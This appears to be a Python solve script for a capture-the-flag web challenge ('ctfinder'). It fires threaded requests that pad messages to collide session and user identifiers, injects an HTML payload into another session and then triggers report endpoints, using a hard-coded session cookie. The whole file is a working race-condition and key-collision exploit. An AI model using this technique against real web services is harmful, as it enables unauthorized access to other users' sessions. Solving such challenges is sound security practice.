import _thread
import time
import requests


import string

def customUrlEncode(text):

    # punctuation: '!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~'
    # whitespace: ' \t\n\r\x0b\x0c'
    text = text.replace("\n","")
    for c in string.punctuation + string.whitespace:
        text = text.replace(c,"\x01"+c.encode().hex())
    text = text.replace("\x01","%")
    return text


HTTP_MAIN = "https://ctfinder-288f6ca7275c832e.instancer.idek.team"

def req(msg,sess_id,cookie_session):


    resp = requests.post(f"{HTTP_MAIN}/sessions/{sess_id}/messages", headers={"Content-Type":"application/json"},json={"content":msg},cookies={"session":cookie_session})

    print(sess_id, resp.text)


def req2(msg,sess_id,cookie_session):


    resp = requests.get(f"{HTTP_MAIN}/sessions/{sess_id}/report", cookies={"session":cookie_session})

    print(sess_id, resp.text)





if __name__ == "__main__":

    payload = """<div><div><div><div><div><div>"""

    msg = payload

    sess_id = "0d4eebba-db68-4b48-a3d2-9545e60258fc"
    user_id = "d854fa46-e500-4889-b6ff-2b6c67891254"

    userlen = len(f"{user_id}:")

    # key = f"{session_id}:{user_id}:{nonce}:{timestamp}"

    # 1 session_id = {session_id}:{user_id}
    # 2 nonce = {user_id}:{nonce}
    
    cookie_session = "eyJpc19hZG1pbiI6MCwidXNlcl9pZCI6ImQ4NTRmYTQ2LWU1MDAtNDg4OS1iNmZmLTJiNmM2Nzg5MTI1NCIsInVzZXJuYW1lIjoid3d3dyJ9.aI-m6w.7k0SZzHYRau8L2Q1LkqHCOO1Owc"
    _thread.start_new_thread(req,(f"{"A"*(128-userlen)}",f"{sess_id}:{user_id}", cookie_session))
    time.sleep(0.1)
    _thread.start_new_thread(req,(f"{user_id}:{"A"*(128-userlen)} {payload}",sess_id, cookie_session))
    time.sleep(5)
    _thread.start_new_thread(req2,(f"-",f"{sess_id}:{user_id}", cookie_session))
    time.sleep(0.1)
    _thread.start_new_thread(req2,(f"-",sess_id, cookie_session))

    time.sleep(10)
